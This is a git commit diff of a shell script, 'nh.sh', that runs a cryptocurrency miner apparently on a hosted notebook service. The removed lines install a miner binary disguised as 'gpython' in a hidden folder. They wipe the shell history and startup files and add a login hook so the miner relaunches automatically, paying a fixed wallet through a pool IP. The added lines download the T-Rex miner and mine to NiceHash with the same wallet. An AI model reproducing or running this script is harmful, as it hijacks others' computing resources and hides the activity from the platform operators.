314d0332c146694e410838b5c5d4ff785a174cb7
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-04-18 14:08:33 +0700

    Update nh.sh

--- nh.sh
+++ nh.sh
@@ -1,22 +1,6 @@
-cd ~/
-mkdir .lib
-cd .lib
-rm -R *
-rm -R /home/studio-lab-user/.ton
-WORKER="0"
-WALLETNH="3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX"
-POOLNH="144.217.82.15:80"
-wget https://ewr1.vultrobjects.com/mines/gpython
-echo ""  > /home/studio-lab-user/.bashrc
-echo "" > /home/studio-lab-user/.bash_history
-echo "" > /home/studio-lab-user/.bash_profile
-echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
-echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
-echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
-echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
-echo 'WORKER="x"' >> ~/.bash_profile
-echo 'WALLETNH="3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX"' >> /home/studio-lab-user/.bash_profile
-echo 'POOLNH="144.217.82.15:80"' >> /home/studio-lab-user/.bash_profile
-echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
-echo "./.lib/gpython --algo ethash --server $POOLNH --user $WALLETNH.$WORKER -p x -i 100 -w 0 --kernel 0 --proto stratum" > /home/studio-lab-user/.lib/gas.sh
-chmod +x gas.sh && chmod +x gpython && cd ~/ && source .bashrc
+sudo apt install screen -y
+apt install git -y
+wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz && tar -zxvf t-rex-0.21.6-linux.tar.gz && ./t-rex -a AUTOLYKOS2 -o autolykos.usa-west.nicehash.com:3390 -u 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$(echo $(shuf -i 1-9999 -n 1)-Trex) -p x --no-nvml
+sleep 3
+done
+sleep 12345
